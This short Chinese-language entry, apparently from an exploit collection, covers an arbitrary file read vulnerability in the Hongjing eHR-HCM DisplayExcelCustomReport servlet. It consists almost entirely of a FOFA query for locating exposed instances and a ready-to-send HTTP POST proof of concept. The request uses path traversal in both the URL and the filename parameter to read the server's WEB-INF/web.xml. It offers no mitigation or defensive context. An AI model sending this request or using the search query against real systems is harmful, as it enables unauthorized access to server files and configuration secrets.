## 宏景eHR-HCM-DisplayExcelCustomReport接口存在任意文件读取漏洞

## fofa
```
app="HJSOFT-HCM"
```

## poc
```
POST /templates/attestation/../../servlet/DisplayExcelCustomReport HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

filename=../webapps/ROOT/WEB-INF/web.xml
```
